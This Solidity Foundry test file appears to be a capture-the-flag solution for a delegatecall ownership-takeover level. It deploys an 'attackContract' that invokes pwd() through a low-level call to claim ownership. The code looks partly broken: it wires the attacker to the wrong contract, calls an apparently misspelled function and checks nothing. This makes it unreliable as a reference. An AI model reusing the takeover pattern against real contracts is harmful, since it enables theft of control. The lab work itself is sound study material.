// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test , console} from "forge-std/Test.sol";

import {Delegate,Delegation} from "../src/Delegate.sol";

contract DelegateTest is Test {

    Delegate del;
    Delegation dele;

    attackContract attack;

    address owner = makeAddr("OW");

 function setUp() public {

    del = new Delegate(msg.sender);
    vm.prank(owner);
    dele = new Delegation(address(del));
    attack = new attackContract(address(del));

 }

 function testClaimOwnership() public {

    vm.prank(address(attack));
    attack.pwd();


    console.log(owner);
    console.log(del.owner());
    console.log(msg.sender);
    console.log(address(dele));


 }

}

contract attackContract {

        Delegation delegate;

    constructor(address _delegateAddress) public {
        delegate = Delegation(_delegateAddress);
    }


    function pwd() public {

        (bool secc,) = address(delegate).call(abi.encodeWithSignature("pwd()"));
    }

}
